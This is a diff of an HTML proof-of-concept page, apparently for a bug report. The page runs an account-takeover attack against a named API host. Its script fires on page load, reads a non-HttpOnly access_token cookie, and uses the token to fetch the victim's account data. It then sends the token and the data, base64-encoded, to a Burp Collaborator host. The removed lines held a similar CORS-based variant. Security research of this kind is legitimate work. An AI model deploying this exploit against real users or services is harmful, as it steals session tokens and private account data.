@@ -1,53 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Research PoC</title>
+    <title>Critical Security Audit - PoC</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; padding: 50px; }
-        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
-        .stolen { color: #d9534f; font-weight: bold; word-break: break-all; }
-        #status { font-weight: bold; margin-bottom: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; padding: 40px; }
+        .exploit-card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
+        .header { border-bottom: 2px solid #eee; margin-bottom: 20px; padding-bottom: 10px; }
+        .status-box { padding: 15px; border-radius: 6px; margin-bottom: 20px; font-weight: bold; text-align: center; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .stolen-label { color: #e74c3c; font-weight: bold; margin-top: 20px; display: block; }
+        .data-box { background: #2d3436; color: #00cec9; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; min-height: 50px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>CORS + Cookie Flag Exploit PoC</h2>
-        <div id="status" style="color: blue;">Initializing Exploit...</div>
-        <p><strong>Step 1: Stolen JWT:</strong></p>
-        <div id="jwt-area" class="stolen">Waiting...</div>
-        <p><strong>Step 2: Stolen Account Data:</strong></p>
-        <pre id="data-area" class="stolen">Waiting...</pre>
+    <div class="exploit-card">
+        <div class="header">
+            <h2>Account Takeover Proof of Concept</h2>
+            <p>Target: <code>simplecast-cms-api-gateway.eks.simplecast.com</code></p>
+        </div>
+
+        <div id="status" class="status-box" style="background: #fff3cd; color: #856404;">Initializing Attack Chain...</div>
+
+        <span class="stolen-label">1. Stolen JWT (Bypassing HttpOnly Check):</span>
+        <div id="jwt-area" class="data-box">Extracting token...</div>
+
+        <span class="stolen-label">2. Stolen Account JSON (Bypassing CORS + Lax Cookies):</span>
+        <pre id="data-area" class="data-box">Retrieving private data...</pre>
     </div>
+
     <script>
-        const target = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const collaborator = "https://lj82gdt3ghraty65x3bna1ed349vxmpae.oastify.com"; // <-- REPLACE WITH YOUR COLLABORATOR URL
+        // --- CONFIGURATION ---
+        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const COLLABORATOR_URL = "https://d9nu65jv69h2jqwxnv1f0t45twznneg25.oastify.com"; 
+        // ---------------------
 
         async function startExploit() {
             try {
-                // 1. Theft via missing HttpOnly
+                // STEP 1: Direct Token Theft
+                // Because HttpOnly is missing, we grab the token directly from document.cookie
                 const cookies = document.cookie;
                 const tokenMatch = cookies.match(/access_token=([^;]+)/);
+                
                 if (tokenMatch) {
                     const jwt = tokenMatch[1];
                     document.getElementById('jwt-area').innerText = jwt;
-                    fetch(`${collaborator}/?type=jwt_theft&token=${jwt}`);
+
+                    // STEP 2: Authenticated Data Theft
+                    // We manually use the stolen token in the Authorization header.
+                    // This bypasses 'SameSite=Lax' restrictions that cause the 401 error.
+                    const response = await fetch(TARGET_API, { 
+                        method: "GET", 
+                        headers: {
+                            "Authorization": "Bearer " + jwt 
+                        }
+                    });
+
+                    if (response.ok) {
+                        const json = await response.json();
+                        document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
+                        document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL: ACCOUNT HIJACKED";
+                        document.getElementById('status').className = "status-box success";
+
+                        // STEP 3: EXFILTRATION
+                        // Send everything to the attacker's server (Burp Collaborator)
+                        const exfilData = btoa(JSON.stringify({
+                            stolen_token: jwt,
+                            account_data: json
+                        }));
+                        fetch(`${COLLABORATOR_URL}/?exfil=${exfilData}`);
+                    } else {
+                        document.getElementById('status').innerText = "API Error: " + response.status;
+                    }
+                } else {
+                    document.getElementById('status').innerText = "FAILED: No 'access_token' cookie found.";
+                    document.getElementById('jwt-area').innerText = "Is the victim logged in?";
                 }
-
-                // 2. Theft via Reflected CORS
-                const response = await fetch(target, { method: "GET", credentials: "include" });
-                const json = await response.json();
-                document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
-                document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL - DATA EXFILTRATED";
-                document.getElementById('status').style.color = "red";
-
-                // Exfiltrate to Collaborator
-                fetch(`${collaborator}/?type=cors_data&payload=${btoa(JSON.stringify(json))}`);
             } catch (err) {
-                document.getElementById('status').innerText = "Exploit Failed: " + err.message;
-                document.getElementById('status').style.color = "orange";
+                document.getElementById('status').innerText = "CRITICAL ERROR: " + err.message;
             }
         }
-        window.onload = startExploit;
+
+        // Run after 1 second to ensure page load
+        setTimeout(startExploit, 1000);
     </script>
 </body>
 </html>
